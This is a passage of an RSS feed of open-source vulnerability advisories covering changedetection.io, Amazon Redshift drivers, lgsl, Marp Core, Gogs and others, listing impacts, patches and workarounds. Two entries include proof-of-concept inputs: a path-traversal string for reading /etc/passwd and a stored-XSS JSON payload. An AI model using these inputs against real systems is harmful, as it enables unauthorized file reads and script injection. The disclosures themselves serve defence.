                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-j5vv-6wjg-cfr8'>https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-j5vv-6wjg-cfr8</a></li><li>- <a target='_blank' href='https://github.com/dgtlmoon/changedetection.io/commit/4419bc0e61d0b03c588bd573a3602bbcfd953671'>https://github.com/dgtlmoon/changedetection.io/commit/4419bc0e61d0b03c588bd573a3602bbcfd953671</a></li><li>- <a target='_blank' href='https://github.com/dgtlmoon/changedetection.io/commit/f7e9846c9b40a229813d19cdb66bf60fbe5e6a2a'>https://github.com/dgtlmoon/changedetection.io/commit/f7e9846c9b40a229813d19cdb66bf60fbe5e6a2a</a></li><li>- <a target='_blank' href='https://github.com/dgtlmoon/changedetection.io'>https://github.com/dgtlmoon/changedetection.io</a></li></ul><br>
                            <b>Details:</b> <b>changedetection.io Vulnerable to Improper Input Validation Leading to LFR&#x2F;Path Traversal</b><br>### Summary
Improper input validation in the application can allow attackers to perform local file read (LFR) or path traversal attacks. These vulnerabilities occur when user input is used to construct file paths without adequate sanitization or validation. For example, using `file:..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd` or `file: &#x2F;&#x2F;&#x2F;etc&#x2F;passwd` can bypass weak validations and allow unauthorized access to sensitive files. Even though this has been addressed in previous patch, it is still insufficient.

### Details
The check in this line of code is insufficient.
```
if re.search(r&#x27;^file:&#x2F;&#x27;, url.strip(), re.IGNORECASE):
```
The attacker can still bypass this by using:
-`file:..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd`
-`file: &#x2F;&#x2F;&#x2F;etc&#x2F;passwd` (with space before &#x2F;)

### PoC
- Open up a changedetection.io instance with a webdriver configured.
- Create a new watch with `file:..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd`.
- Check the watch preview.
- The contents of `&#x2F;etc&#x2F;passwd` should pop out.

### Screenshots
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;55c34f2e-cafb-4a7a-a7ef-ec222e3f519b)
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;d41189f5-7bf2-48b5-9ce3-c26f79cefeda)
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-gitlab-2023-5117: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-gitlab-2023-5117</link>
                    <pubDate>2024-12-27T07:25:54.433Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-gitlab-2023-5117'>https://osv.dev/vulnerability/BIT-gitlab-2023-5117</a><br>
                            <b>Published:</b> 2024-12-27T07:25:54.433Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://gitlab.com/gitlab-org/gitlab/-/issues/398250'>https://gitlab.com/gitlab-org/gitlab/-/issues/398250</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue was discovered in GitLab CE&#x2F;EE affecting all versions before 17.6.0 in which users were unaware that files uploaded to comments on confidential issues and epics of public projects could be accessed without authentication via a direct link to the uploaded file URL.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-qx95-cwh6-9mvq: 0 | <b>TCPDF missing character escape on error messages</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-qx95-cwh6-9mvq</link>
                    <pubDate>2024-12-27T06:30:48Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-qx95-cwh6-9mvq'>https://osv.dev/vulnerability/GHSA-qx95-cwh6-9mvq</a><br>
                            <b>Published:</b> 2024-12-27T06:30:48Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/tecnickcom/TCPDF/commit/11778aaa2d9e30a9ae1c1ee97ff349344f0ad6e1'>https://github.com/tecnickcom/TCPDF/commit/11778aaa2d9e30a9ae1c1ee97ff349344f0ad6e1</a></li><li>- <a target='_blank' href='https://andrea0.medium.com/analysis-of-cve-2024-56527-dbdab6962add'>https://andrea0.medium.com/analysis-of-cve-2024-56527-dbdab6962add</a></li><li>- <a target='_blank' href='https://github.com/tecnickcom/TCPDF'>https://github.com/tecnickcom/TCPDF</a></li><li>- <a target='_blank' href='https://github.com/tecnickcom/TCPDF/compare/6.7.8...6.8.0'>https://github.com/tecnickcom/TCPDF/compare/6.7.8...6.8.0</a></li><li>- <a target='_blank' href='https://tcpdf.org'>https://tcpdf.org</a></li></ul><br>
                            <b>Details:</b> <b>TCPDF missing character escape on error messages</b><br>An issue was discovered in TCPDF before 6.8.0. The Error function lacks an htmlspecialchars call for the error message.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2024-1406: 0 | <b>UNKNOWN READ in _TIFFVSetField</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2024-1406</link>
                    <pubDate>2024-12-27T00:16:38.077175Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2024-1406'>https://osv.dev/vulnerability/OSV-2024-1406</a><br>
                            <b>Published:</b> 2024-12-27T00:16:38.077175Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=385406655'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=385406655</a></li></ul><br>
                            <b>Details:</b> <b>UNKNOWN READ in _TIFFVSetField</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=385406655

```
Crash type: UNKNOWN READ
Crash state:
_TIFFVSetField
TIFFSetField
TIFFFetchNormalTag
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-8gc2-vq6m-rwjw: 8.0 | <b>Amazon Redshift Python Connector vulnerable to SQL Injection</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-8gc2-vq6m-rwjw</link>
                    <pubDate>2024-12-26T20:28:09Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-8gc2-vq6m-rwjw'>https://osv.dev/vulnerability/GHSA-8gc2-vq6m-rwjw</a><br>
                            <b>Published:</b> 2024-12-26T20:28:09Z<br>
                            <b>Severity:</b> 8.0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/aws/amazon-redshift-python-driver/security/advisories/GHSA-8gc2-vq6m-rwjw'>https://github.com/aws/amazon-redshift-python-driver/security/advisories/GHSA-8gc2-vq6m-rwjw</a></li><li>- <a target='_blank' href='https://aws.amazon.com/security/security-bulletins/AWS-2024-015'>https://aws.amazon.com/security/security-bulletins/AWS-2024-015</a></li><li>- <a target='_blank' href='https://github.com/aws/amazon-redshift-python-driver'>https://github.com/aws/amazon-redshift-python-driver</a></li></ul><br>
                            <b>Details:</b> <b>Amazon Redshift Python Connector vulnerable to SQL Injection</b><br>### Summary
A SQL injection in the Amazon Redshift Python Connector in version 2.1.4 allows a user to gain escalated privileges via schema injection in the get_schemas, get_tables, or get_columns Metadata APIs. Users should upgrade to the driver version 2.1.5 or revert to driver version 2.1.3.

### Impact
A SQL injection is possible in the Amazon Redshift Python Connector, version 2.1.4, when leveraging metadata APIs to retrieve information about database schemas, tables, or columns.

**Impacted versions:** Amazon Redshift Python Connector version 2.1.4.

### Patches
The issue described above has been addressed in the Amazon Redshift Python Connector, version 2.1.5. 

The patch implemented in this version ensures that every metadata command input is sent to the Redshift server as part of a parameterized query, using either QUOTE_IDENT(string) or QUOTE_LITERAL(string). After processing all the inputs into quoted identifiers or literals, the metadata command is composed using these inputs and then executed on the server.

### Workarounds
Use the previous version of the Amazon Redshift Python Connector, version 2.1.3.

### References
If you have any questions or comments about this advisory we ask that you contact AWS&#x2F;Amazon Security via our vulnerability reporting page [1] or directly via email to [aws-security@amazon.com](mailto:aws-security@amazon.com). Please do not create a public GitHub issue.

[1] Vulnerability reporting page: https:&#x2F;&#x2F;aws.amazon.com&#x2F;security&#x2F;vulnerability-reporting

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-8596-2jgr-ppj7: 8.0 | <b>Amazon Redshift JDBC Driver vulnerable to SQL Injection</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-8596-2jgr-ppj7</link>
                    <pubDate>2024-12-26T20:27:10Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-8596-2jgr-ppj7'>https://osv.dev/vulnerability/GHSA-8596-2jgr-ppj7</a><br>
                            <b>Published:</b> 2024-12-26T20:27:10Z<br>
                            <b>Severity:</b> 8.0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/aws/amazon-redshift-jdbc-driver/security/advisories/GHSA-8596-2jgr-ppj7'>https://github.com/aws/amazon-redshift-jdbc-driver/security/advisories/GHSA-8596-2jgr-ppj7</a></li><li>- <a target='_blank' href='https://aws.amazon.com/security/security-bulletins/AWS-2024-015'>https://aws.amazon.com/security/security-bulletins/AWS-2024-015</a></li><li>- <a target='_blank' href='https://github.com/aws/amazon-redshift-jdbc-driver'>https://github.com/aws/amazon-redshift-jdbc-driver</a></li></ul><br>
                            <b>Details:</b> <b>Amazon Redshift JDBC Driver vulnerable to SQL Injection</b><br>### Summary
A SQL injection in the Amazon Redshift JDBC Driver in v2.1.0.31 allows a user to gain escalated privileges via schema injection in the getSchemas, getTables, or getColumns Metadata APIs. Users should upgrade to the driver version 2.1.0.32 or revert to driver version 2.1.0.30.

### Impact
A SQL injection is possible in the Amazon Redshift JDBC Driver, version 2.1.0.31, when leveraging metadata APIs to retrieve information about database schemas, tables, or columns.

**Impacted versions:** Amazon Redshift JDBC Driver version 2.1.0.31.

### Patches
The issue described above has been addressed in the Amazon Redshift JDBC Driver, version 2.1.0.32.

The patch implemented in this version ensures that every metadata command input is sent to the Redshift server as part of a parameterized query, using either QUOTE_IDENT(string) or QUOTE_LITERAL(string). After processing all the inputs into quoted identifiers or literals, the metadata command is composed using these inputs and then executed on the server.

### Workarounds
Use the previous version of the Amazon Redshift JDBC Driver, 2.1.0.30.

### References
If you have any questions or comments about this advisory we ask that you contact AWS&#x2F;Amazon Security via our vulnerability reporting page [1] or directly via email to [aws-security@amazon.com](mailto:aws-security@amazon.com). Please do not create a public GitHub issue.

[1] Vulnerability reporting page: https:&#x2F;&#x2F;aws.amazon.com&#x2F;security&#x2F;vulnerability-reporting

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-xx95-62h6-h7v3: 0 | <b>lgsl Stored Cross-Site Scripting vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-xx95-62h6-h7v3</link>
                    <pubDate>2024-12-26T20:20:12Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-xx95-62h6-h7v3'>https://osv.dev/vulnerability/GHSA-xx95-62h6-h7v3</a><br>
                            <b>Published:</b> 2024-12-26T20:20:12Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/tltneon/lgsl/security/advisories/GHSA-xx95-62h6-h7v3'>https://github.com/tltneon/lgsl/security/advisories/GHSA-xx95-62h6-h7v3</a></li><li>- <a target='_blank' href='https://github.com/tltneon/lgsl/commit/3fbd3bb581b636f7fd3ea0592c5f8df87d3a2843'>https://github.com/tltneon/lgsl/commit/3fbd3bb581b636f7fd3ea0592c5f8df87d3a2843</a></li><li>- <a target='_blank' href='https://github.com/tltneon/lgsl'>https://github.com/tltneon/lgsl</a></li></ul><br>
                            <b>Details:</b> <b>lgsl Stored Cross-Site Scripting vulnerability</b><br>### Summary

A stored cross-site scripting (XSS) vulnerability was identified in lgsl. The issue arises from improper sanitation of user input. Everyone who accesses this page will be affected by this attack.

### Details

The function `lgsl_query_40` in `lgsl_protocol.php` has implemented an HTTP crawler. This function makes a request to the registered game server, and upon crawling the malicious `&#x2F;info` endpoint with our payload, will render our javascript on the info page. This information is being displayed via `lgsl_details.php`

#### Affected Code:
```php
      foreach ($server[&#x27;e&#x27;] as $field =&amp;gt; $value) {
        $value = preg_replace(&#x27;&#x2F;((https*:\&#x2F;\&#x2F;|https*:\&#x2F;\&#x2F;www\.|www\.)[\w\d\.\-\&#x2F;=$?​]*)&#x2F;i&#x27;, &quot;&amp;lt;a href=&#x27;$1&#x27; target=&#x27;_blank&#x27;&amp;gt;$1&amp;lt;&#x2F;a&amp;gt;&quot;, html_entity_decode($value));
        $output .= &quot;
        &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt; {$field} &amp;lt;&#x2F;td&amp;gt;&amp;lt;td&amp;gt; {$value} &amp;lt;&#x2F;td&amp;gt;&amp;lt;&#x2F;tr&amp;gt;&quot;;
      }
```
### PoC

1. Create a game server with type `eco` and set the target host and port accordingly to your ttack server. I have crafted this json payload that is being parsed according to the schema and being served on `&#x2F;info` 

2. Serve the following JSON payload at `&#x2F;info` on your handler
```json
{
  &quot;Animals&quot;: &quot;1&quot;,
  &quot;EconomyDesc&quot;: &quot;&amp;lt;img src=x onerror=prompt(1)&amp;gt;&quot;
}
```
3. Access the corresponding server info page at `&#x2F;s?=`. Upon refreshing &amp; crawling our server, it should execute our javascript.


                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-x52f-h5g4-8qv5: 5.3 | <b>Marp Core allows XSS by improper neutralization of HTML sanitization</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-x52f-h5g4-8qv5</link>
                    <pubDate>2024-12-26T18:25:25Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-x52f-h5g4-8qv5'>https://osv.dev/vulnerability/GHSA-x52f-h5g4-8qv5</a><br>
                            <b>Published:</b> 2024-12-26T18:25:25Z<br>
                            <b>Severity:</b> 5.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/marp-team/marp-core/security/advisories/GHSA-x52f-h5g4-8qv5'>https://github.com/marp-team/marp-core/security/advisories/GHSA-x52f-h5g4-8qv5</a></li><li>- <a target='_blank' href='https://github.com/marp-team/marp-core/pull/282'>https://github.com/marp-team/marp-core/pull/282</a></li><li>- <a target='_blank' href='https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49'>https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49</a></li><li>- <a target='_blank' href='https://github.com/marp-team/marp-core'>https://github.com/marp-team/marp-core</a></li><li>- <a target='_blank' href='https://github.com/marp-team/marp-core/releases/tag/v3.9.1'>https://github.com/marp-team/marp-core/releases/tag/v3.9.1</a></li><li>- <a target='_blank' href='https://github.com/marp-team/marp-core/releases/tag/v4.0.1'>https://github.com/marp-team/marp-core/releases/tag/v4.0.1</a></li></ul><br>
                            <b>Details:</b> <b>Marp Core allows XSS by improper neutralization of HTML sanitization</b><br>Marp Core ([`@marp-team&#x2F;marp-core`](https:&#x2F;&#x2F;www.npmjs.com&#x2F;package&#x2F;@marp-team&#x2F;marp-core)) from v3.0.2 to v3.9.0 and v4.0.0, are vulnerable to cross-site scripting (XSS)  due to improper neutralization of HTML sanitization.

### Impact

Marp Core includes an HTML sanitizer with allowlist support. In the affected versions, the built-in allowlist is enabled by default. When the allowlist is active, if insufficient HTML comments are included, the sanitizer may fail to properly sanitize HTML content and lead cross-site scripting (XSS).

### Patches

Marp Core [v3.9.1](https:&#x2F;&#x2F;github.com&#x2F;marp-team&#x2F;marp-core&#x2F;releases&#x2F;tag&#x2F;v3.9.1) and [v4.0.1](https:&#x2F;&#x2F;github.com&#x2F;marp-team&#x2F;marp-core&#x2F;releases&#x2F;tag&#x2F;v4.0.1) have been patched to fix that.

### Workarounds

If you are unable to update the package immediately, disable all HTML tags by setting `html: false` option in the `Marp` class constructor.

```javascript
const marp = new Marp({ html: false })
```

### References

- [CWE-79: Improper Neutralization of Input During Web Page Generation (&#x27;Cross-site Scripting&#x27;)](https:&#x2F;&#x2F;cwe.mitre.org&#x2F;data&#x2F;definitions&#x2F;79.html)
- https:&#x2F;&#x2F;github.com&#x2F;marp-team&#x2F;marp-core&#x2F;pull&#x2F;282
- https:&#x2F;&#x2F;github.com&#x2F;marp-team&#x2F;marp-core&#x2F;commit&#x2F;61a1def244d1b6faa8e2c0be97ec0b68cab3ab49

### Credits

Thanks to @Ry0taK for finding out this vulnerability.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-12952: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-12952</link>
                    <pubDate>2024-12-26T13:15:06Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-12952'>https://osv.dev/vulnerability/CVE-2024-12952</a><br>
                            <b>Published:</b> 2024-12-26T13:15:06Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/melMass/comfy_mtb/issues/224'>https://github.com/melMass/comfy_mtb/issues/224</a></li><li>- <a target='_blank' href='https://github.com/melMass/comfy_mtb/issues/224#issuecomment-2552664778'>https://github.com/melMass/comfy_mtb/issues/224#issuecomment-2552664778</a></li><li>- <a target='_blank' href='https://github.com/melMass/comfy_mtb/issues/224#issuecomment-2553432365'>https://github.com/melMass/comfy_mtb/issues/224#issuecomment-2553432365</a></li><li>- <a target='_blank' href='https://vuldb.com/?ctiid.289315'>https://vuldb.com/?ctiid.289315</a></li><li>- <a target='_blank' href='https://vuldb.com/?id.289315'>https://vuldb.com/?id.289315</a></li><li>- <a target='_blank' href='https://vuldb.com/?submit.468683'>https://vuldb.com/?submit.468683</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A vulnerability classified as critical was found in melMass comfy_mtb up to 0.1.4. Affected by this vulnerability is the function run_command of the file comfy_mtb&#x2F;endpoint.py of the component Dependency Handler. The manipulation leads to code injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The patch is named d6e004cce2c32f8e48b868e66b89f82da4887dc3. It is recommended to apply a patch to fix this issue.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-56430: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-56430</link>
                    <pubDate>2024-12-25T18:15:22Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-56430'>https://osv.dev/vulnerability/CVE-2024-56430</a><br>
                            <b>Published:</b> 2024-12-25T18:15:22Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> cpp<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/UnionTech-Software/openfhe-PoC'>https://github.com/UnionTech-Software/openfhe-PoC</a></li><li>- <a target='_blank' href='https://github.com/openfheorg/openfhe-development/blob/7b8346f4eac27121543e36c17237b919e03ec058/src/binfhe/lib/binfhe-base-scheme.cpp#L307-L308'>https://github.com/openfheorg/openfhe-development/blob/7b8346f4eac27121543e36c17237b919e03ec058/src/binfhe/lib/binfhe-base-scheme.cpp#L307-L308</a></li><li>- <a target='_blank' href='https://github.com/openfheorg/openfhe-development/releases/tag/v1.2.3'>https://github.com/openfheorg/openfhe-development/releases/tag/v1.2.3</a></li></ul><br>
                            <b>Details:</b> <b></b><br>OpenFHE through 1.2.3 has a NULL pointer dereference in BinFHEContext::EvalFloor in lib&#x2F;binfhe-base-scheme.cpp.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2023-5117: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2023-5117</link>
                    <pubDate>2024-12-25T15:15:05Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2023-5117'>https://osv.dev/vulnerability/CVE-2023-5117</a><br>
                            <b>Published:</b> 2024-12-25T15:15:05Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://gitlab.com/gitlab-org/gitlab/-/issues/398250'>https://gitlab.com/gitlab-org/gitlab/-/issues/398250</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue was discovered in GitLab CE&#x2F;EE affecting all versions before 17.6.0 in which users were unaware that files uploaded to comments on confidential issues and epics of public projects could be accessed without authentication via a direct link to the uploaded file URL.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-vm62-9jw3-c8w3: 9.9 | <b>Gogs has an argument Injection in the built-in SSH server</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-vm62-9jw3-c8w3</link>
                    <pubDate>2024-12-23T20:38:34Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-vm62-9jw3-c8w3'>https://osv.dev/vulnerability/GHSA-vm62-9jw3-c8w3</a><br>
                            <b>Published:</b> 2024-12-23T20:38:34Z<br>
                            <b>Severity:</b> 9.9<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/gogs/gogs/security/advisories/GHSA-vm62-9jw3-c8w3'>https://github.com/gogs/gogs/security/advisories/GHSA-vm62-9jw3-c8w3</a></li><li>- <a target='_blank' href='https://github.com/gogs/gogs'>https://github.com/gogs/gogs</a></li><li>- <a target='_blank' href='https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1'>https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1</a></li><li>- <a target='_blank' href='https://www.vicarius.io/vsociety/posts/argument-injection-in-gogs-ssh-server-cve-2024-39930'>https://www.vicarius.io/vsociety/posts/argument-injection-in-gogs-ssh-server-cve-2024-39930</a></li></ul><br>
                            <b>Details:</b> <b>Gogs has an argument Injection in the built-in SSH server</b><br>### Impact

When the built-in SSH server is enabled (`[server] START_SSH_SERVER = true`), unprivileged user accounts with at least one SSH key can execute arbitrary commands on the Gogs instance with the privileges of the user specified by `RUN_USER` in the configuration. It allows attackers to access and alter any users&#x27; code hosted on the same instance.

### Patches

The `env` command sent to the internal SSH server has been changed to be a passthrough (https:&#x2F;&#x2F;github.com&#x2F;gogs&#x2F;gogs&#x2F;pull&#x2F;7868), i.e. the feature is effectively removed. Users should upgrade to 0.13.1 or the latest 0.14.0+dev.

### Workarounds

[Disable the use of built-in SSH server](https:&#x2F;&#x2F;github.com&#x2F;gogs&#x2F;gogs&#x2F;blob&#x2F;7adac94f1e93cc5c3545ea31688662dcef9cd737&#x2F;conf&#x2F;app.ini#L76-L77) on operating systems other than Windows.

### References

https:&#x2F;&#x2F;www.cve.org&#x2F;CVERecord?id=CVE-2024-39930

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-9pp6-wq8c-3w2c: 9.9 | <b>Gogs allows argument injection during the previewing of changes</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-9pp6-wq8c-3w2c</link>
                    <pubDate>2024-12-23T20:38:27Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-9pp6-wq8c-3w2c'>https://osv.dev/vulnerability/GHSA-9pp6-wq8c-3w2c</a><br>
                            <b>Published:</b> 2024-12-23T20:38:27Z<br>
                            <b>Severity:</b> 9.9<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/gogs/gogs/security/advisories/GHSA-9pp6-wq8c-3w2c'>https://github.com/gogs/gogs/security/advisories/GHSA-9pp6-wq8c-3w2c</a></li><li>- <a target='_blank' href='https://github.com/gogs/gogs'>https://github.com/gogs/gogs</a></li><li>- <a target='_blank' href='https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1'>https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1</a></li></ul><br>
                            <b>Details:</b> <b>Gogs allows argument injection during the previewing of changes</b><br>### Impact

Unprivileged user accounts can write to arbitrary files on the filesystem. We could demonstrate its exploitation to force a re-installation of the instance, granting administrator rights. It allows accessing and altering any user&#x27;s code hosted on the same instance.

### Patches

Unintended Git options has been ignored for diff preview (https:&#x2F;&#x2F;github.com&#x2F;gogs&#x2F;gogs&#x2F;pull&#x2F;7871). Users should upgrade to 0.13.1 or the latest 0.14.0+dev.

### Workarounds

No viable workaround available, please only grant access to trusted users to your Gogs instance on affected versions.

### References

https:&#x2F;&#x2F;www.cve.org&#x2F;CVERecord?id=CVE-2024-39932

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-ccqv-43vm-4f3w: 9.9 | <b>Gogs allows deletion of internal files</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-ccqv-43vm-4f3w</link>
                    <pubDate>2024-12-23T20:38:20Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-ccqv-43vm-4f3w'>https://osv.dev/vulnerability/GHSA-ccqv-43vm-4f3w</a><br>
                            <b>Published:</b> 2024-12-23T20:38:20Z<br>
                            <b>Severity:</b> 9.9<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/gogs/gogs/security/advisories/GHSA-ccqv-43vm-4f3w'>https://github.com/gogs/gogs/security/advisories/GHSA-ccqv-43vm-4f3w</a></li><li>- <a target='_blank' href='https://github.com/gogs/gogs'>https://github.com/gogs/gogs</a></li><li>- <a target='_blank' href='https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1'>https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1</a></li></ul><br>
                            <b>Details:</b> <b>Gogs allows deletion of internal files</b><br>### Impact

Unprivileged user accounts can execute arbitrary commands on the Gogs instance with the privileges of the account specified by `RUN_USER` in the configuration. It allows attackers to access and alter any users&#x27; code hosted on the same instance.

### Patches

Deletion of `.git` files has been prohibited (https:&#x2F;&#x2F;github.com&#x2F;gogs&#x2F;gogs&#x2F;pull&#x2F;7870). Users should upgrade to 0.13.1 or the latest 0.14.0+dev.

### Workarounds

No viable workaround available, please only grant access to trusted users to your Gogs instance on affected versions.

### References

https:&#x2F;&#x2F;www.cve.org&#x2F;CVERecord?id=CVE-2024-39931

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-m27m-h5gj-wwmg: 7.7 | <b>Gogs allows argument Injection when tagging new releases</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-m27m-h5gj-wwmg</link>
                    <pubDate>2024-12-23T20:38:12Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-m27m-h5gj-wwmg'>https://osv.dev/vulnerability/GHSA-m27m-h5gj-wwmg</a><br>
                            <b>Published:</b> 2024-12-23T20:38:12Z<br>
                            <b>Severity:</b> 7.7<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/gogs/gogs/security/advisories/GHSA-m27m-h5gj-wwmg'>https://github.com/gogs/gogs/security/advisories/GHSA-m27m-h5gj-wwmg</a></li><li>- <a target='_blank' href='https://github.com/gogs/gogs/pull/7872'>https://github.com/gogs/gogs/pull/7872</a></li><li>- <a target='_blank' href='https://github.com/gogs/gogs/commit/76831d0d06c44c5cf46dc22b380440b7507c2f07'>https://github.com/gogs/gogs/commit/76831d0d06c44c5cf46dc22b380440b7507c2f07</a></li><li>- <a target='_blank' href='https://github.com/gogs/gogs'>https://github.com/gogs/gogs</a></li><li>- <a target='_blank' href='https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1'>https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1</a></li></ul><br>
                            <b>Details:</b> <b>Gogs allows argument Injection when tagging new releases</b><br>### Impact

Unprivileged user accounts with at least one SSH key can read arbitrary files on the system. For instance, they could leak the configuration files that could contain database credentials (`[database] *`) and `[security] SECRET_KEY`. Attackers could also exfiltrate TLS certificates, other users&#x27; repositories, and the Gogs database when the SQLite driver is enabled.

### Patches

Unintended Git options has been ignored for creating tags (https:&#x2F;&#x2F;github.com&#x2F;gogs&#x2F;gogs&#x2F;pull&#x2F;7872). Users should upgrade to 0.13.1 or the latest 0.14.0+dev.

### Workarounds

No viable workaround available, please only grant access to trusted users to your Gogs instance on affected versions.

### References

https:&#x2F;&#x2F;www.cve.org&#x2F;CVERecord?id=CVE-2024-39933

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-xwx7-p63r-2rj8: 7.1 | <b>Navidrome Stores JWT Secret in Plaintext in navidrome.db</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-xwx7-p63r-2rj8</link>
                    <pubDate>2024-12-23T20:17:44Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-xwx7-p63r-2rj8'>https://osv.dev/vulnerability/GHSA-xwx7-p63r-2rj8</a><br>
                            <b>Published:</b> 2024-12-23T20:17:44Z<br>
                            <b>Severity:</b> 7.1<br>
                            <b>Langs:</b> <br>
